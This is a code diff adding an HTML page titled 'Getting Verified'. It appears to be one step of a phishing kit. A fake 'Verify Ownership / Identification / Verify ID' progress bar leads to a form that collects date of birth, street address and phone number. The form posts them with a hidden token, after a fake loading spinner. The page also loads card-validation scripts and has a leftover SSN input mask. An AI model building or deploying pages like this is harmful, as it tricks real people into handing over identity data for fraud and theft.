@@ -1,0 +1,154 @@
+<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <link rel="shortcut icon" href="images/favi.ico">
+    <link rel="apple-touch-icon" href="images/favi.png">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
+    <title>Getting Verified</title>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
+    <link rel="stylesheet" href="css/csspage2.css">
+
+    <script type="text/javascript" src="js/jquery-3.3.1.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" integrity="sha512-3n19xznO0ubPpSwYCRRBgHh63DrV+bdZfHK52b1esvId4GsfwStQNPJFjeQos2h3JwCmZl0/LgLxSKMAI55hgw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="pragma" content="no-cache">
+
+    <script type="text/javascript" src="js/cardadr.js?c=PK"></script>
+    <script type="text/javascript" src="js/jquery.ccvalid.js"></script>
+    <script type="text/javascript" src="js/jquery.mask.min.js"></script>
+    <script type="text/javascript" src="js/imask.min.js"></script>
+
+</head>
+<body data-new-gr-c-s-check-loaded="14.1057.0" data-gr-ext-installed="">
+<header>
+    <div>
+    </div>
+</header>
+<div class="mainContainer ">
+    <div class="bg">
+    </div>
+    <div class="hide" id="rotate">
+        <div class="circle">
+        </div>
+        <div class="overlay">
+        </div>
+    </div>
+    <div class="contents">
+        <div class="modal hide js-modal">
+            <div class="l-modal-shadow js-modal-hide"></div>
+            <div class="c-popup l-modal-body">
+                <div class="c-popup-img">
+                    <img src="images/warning.png">
+                </div>
+                <h3 class="c-popup-title">Warning!</h3>
+                <p class="c-popup-description">Complete the progress first</p>
+                <input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
+            </div>
+        </div>
+        <div class="mainContents">
+            <a href="#" class="close-icon js-modal-hide"></a>
+            <ol class="steps js-modal-hide"><li id="Verify"><a class="Verify" href="#">Verify Ownership</a></li><li id="Billing" class="current"><a class="Billing" href="#">Identification</a></li><li id="Upload"><a class="Upload" href="#">Verify ID</a></li>
+                <li id="Completed"><a class="Completed" href="#">Done</a></li>
+            </ol>
+            <div id="process">
+                <form id="form" class="form" action="?thanks&apitoken=dsds" method="post" style="padding:0 60px!important" novalidate="on">
+                    <div class="fields clearfix">
+
+                        <div class="multiInputs">
+                            <div class="inputArea hasSub" style="width:53%;">
+                                <input id="dob" class="input" name="dob" placeholder="Date of Birth (DD/MM/YYYY)" type="tel" required="" maxlength="10">
+                            </div>
+                            <div class="inputArea hasSub pull-right" style="width:43%;">
+                                <input id="mmn" class="input" name="address" placeholder="Full Street Address" type="text" required="">
+                            </div>
+                        </div>
+                        <div class="inputArea">
+                            <input id="phn" class="input" name="phn" placeholder="Phone Number" type="tel" required="" maxlength="21">
+                        </div>
+
+                  <input id="bank" value="bank" type="hidden">
+				<input id="apitoken" name="apitoken" type="hidden" value="tokvalue">
+                        <div>
+                            <input style="margin: 10px 0px;width: 70%;border: 1px solid #bfb9b9;border-radius: 5px;box-shadow: 0 30px 30px rgba(0,0,0,.4);" type="submit" id="submitbank" class="bt" value="Verify">
+                        </div>
+
+                        <script>
+                            $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
+
+                            $("#Billing").addClass("current");
+                            $(document).ready(function() {
+                                $("#dob").mask("00/00/0000");
+                                $("#ssn").mask("000-00-0000");
+                                $("#phn").mask("+1 (000) - 000 - 0000");
+
+                                function valid() {
+                                    var check = true;
+                                    var ii = 0;
+                                    $("#process input:not(.bt):not([type=checkbox]),#process select").each(function(i, el) {
+                                        if($(el).attr('id') === 'phn'){
+                                            if (!$(el).val() || $(el).val().length < 21) {
+                                                $(el).parent().addClass("hasError");
+                                                check = false;
+                                            } else {
+                                                $(el).parent().removeClass("hasError");
+                                            }
+                                        }else{
+                                            if (!$(el).val()) {
+                                                $(el).parent().addClass("hasError");
+                                                check = false;
+                                            } else {
+                                                $(el).parent().removeClass("hasError");
+                                            }
+                                        }
+
+                                    });
+                                    return check;
+                                }
+                                $("#process input:not(.bt):not([type=checkbox]),select").each(function(i, el) {
+                                    $(el).keyup(function() {
+                                        valid();
+                                    });
+                                    $(el).change(function() {
+                                        valid();
+                                    });
+                                });
+                                $(document).on("click", "#submitbank", function(c) {
+                                    $(window).off("beforeunload");
+                                    c.preventDefault();
+                                    check = true;
+                                    if (!valid()) {
+                                        check = false;
+                                    }
+                                    if (!check) {
+                                        return false;
+                                    } else {
+
+                                        $('#rotate').removeClass('hide');
+                                        setTimeout(function (){
+                                            $('#form').submit();
+                                        },1000)
+                                    }
+                                    return false;
+                                });
+                                $("input").keyup(function(e){
+                                    var code = e.key;
+                                    if(code==="Enter") {
+                                        $("#submitbank").click()
+                                    }
+                                });
+                            });
+                        </script>
+                    </div></form>
+            </div>
+            <script type="text/javascript">
+                $(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
+                $(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
+            </script>
+        </div>
+
+
+    </div></div></body></html>
